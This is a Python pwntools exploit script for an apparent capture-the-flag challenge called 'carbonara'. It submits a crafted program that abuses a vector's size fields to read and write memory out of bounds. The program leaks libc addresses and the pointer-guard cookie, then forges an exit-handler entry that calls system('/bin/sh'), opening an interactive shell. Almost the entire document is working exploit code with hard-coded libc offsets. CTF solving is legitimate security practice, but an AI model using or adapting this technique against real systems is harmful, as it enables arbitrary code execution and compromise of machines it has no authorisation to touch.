#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["./docker/files/carbonara"], api=True)
    else:
        return remote("localhost", 12011)
        #return remote("carbonara-01.hfsc.tf", 12011)


# my libc:
#
#     var execve_idx: i32 = 232540;  // 0xe3170/4
#     var execve_sig: i32 = -98693133;  // 0xfa1e0ff3
#     var realloc_hook: i32 = 2018152;  // 0x1ecb68
#     var realloc_hook_idx: i32 = 504538;  // 0x1ecb68/4
#     var realloc_hook_ptr_idx: i32 = 503800;  // 0x1ebfe0/4
#     var one_gadget: i32 = 932606;  // 0xe3afe

def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.execute("set breakpoint pending on")
            tube.gdb.execute("b exit")
            tube.gdb.execute("b system")
            tube.gdb.continue_nowait()
        orig = 1000000
        bad = 1000000000
        elf = 0x464c457f
        execve_idx = 0xeb0f0 // 4
        execve_sig = -98693133  # 0xfa1e0ff3
        stderr = 0x21a860
        stderr_idx = 0x218ea8 // 4
        system = 0x50d60
        initial_idx = 0x21af00 // 4
        cookie_idx = -0x14b890 // 4
        sh = 0x1d869d
        gnu_idx = 0x1dc6a0 // 4
        gnu_sig = 0x20554e47
        first_elf_to_libc = 0x52400000 // 0x1000
        tube.sendafter(
            b"Feed me your spaghetti code! (end with two newlines)\n",
            f"""
package Sample api;

fn Main() -> i32 {{
    var attacker: auto = Vec.New({orig});
    attacker.m = {bad};
    attacker.pos = {bad};
    var i: i32 = {orig};
    var elf_delta: i32 = 1;
    while (true) {{
        var word: i32 = attacker.get(i);
        if (word == {elf}) {{ break; }}
        i = i + elf_delta;
    }}
    i = i + {first_elf_to_libc};
    if (not (attacker.get(i + {gnu_idx}) == {gnu_sig})) {{ return 555; }}
    if (not (attacker.get(i + {execve_idx}) == {execve_sig})) {{ return 666; }}
    var stderr_lo: i32 = attacker.get(i + {stderr_idx});
    var stderr_hi: i32 = attacker.get(i + {stderr_idx} + 1);
    attacker.pos = {orig} + i + {initial_idx};
    attacker.push(0); // next[lo]
    attacker.push(0); // next[hi]
    attacker.push(1); // idx[lo]
    attacker.push(0); // idx[hi]
    attacker.push(4); // flavor[lo]=ef_cxa
    attacker.push(0); // flavor[hi]
    var cookie_lo: i32 = attacker.get({orig} + i + {cookie_idx});
    var cookie_hi: i32 = attacker.get({orig} + i + {cookie_idx} + 1);
    var one_lo: i32 = stderr_lo - {stderr} + {system};
    var one_hi: i32 = stderr_hi;
    one_lo = one_lo ^ cookie_lo;
    one_hi = one_hi ^ cookie_hi;
    var a: i32 = one_lo << 17;
    var b: i32 = one_hi >> 15;
    b = b & 131071;
    var d: i32 = a | b;
    var e: i32 = one_hi << 17;
    var f: i32 = one_lo >> 15;
    f = f & 131071;
    var h: i32 = e | f;
    attacker.push(d); // cxa.fn[lo]  
    attacker.push(h); // cxa.fn[hi]
    attacker.push(stderr_lo - {stderr} + {sh}); // cxa.arg[lo]
    attacker.push(stderr_hi); // cxa.arg[hi]
    return 1337;
}}


""",
        )
        time.sleep(1)
        tube.sendline("echo foo")
        tube.recvuntil("foo")
        print("have fun")
        tube.interactive()


if __name__ == "__main__":
    main()
